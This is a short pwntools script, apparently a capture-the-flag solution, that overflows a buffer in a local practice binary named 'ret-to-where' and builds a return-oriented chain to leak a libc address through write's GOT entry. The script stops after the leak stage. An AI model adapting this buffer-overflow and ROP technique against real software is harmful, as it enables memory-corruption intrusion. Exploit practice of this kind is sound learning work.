from pwn import *

elf = ELF("./ret-to-where")
#libc = ELF('./ret-to-where')
rop = ROP(elf)
io = process(elf.path)

offset = 88
junk = b"A"*offset

pop_rdi = 0x00000000004005e3 #p64((rop.find_gadget(['pop rdi', 'ret']))[0])
pop_rsi_r15 = 0x00000000004005e1 #p64((rop.find_gadget(['pop rsi', 'pop r15', 'ret']))[0])

print(elf.got)
print(elf.plt)
#print(elf.symbols)
#print(elf.got.setvbuf)
#print(elf.plt.write)
#print(pop_rsi_r15)
#info("%#x pop_rsi_r15", pop_rsi_r15)


payload = junk + p64(pop_rsi_r15) + p64(elf.got.write) + p64(0x0) + p64(elf.plt.write) + p64(elf.sym.main)

#io.recv()
io.sendlineafter(b": ", payload)

data = io.recvuntil("Ret to where?: ")


io.interactive()

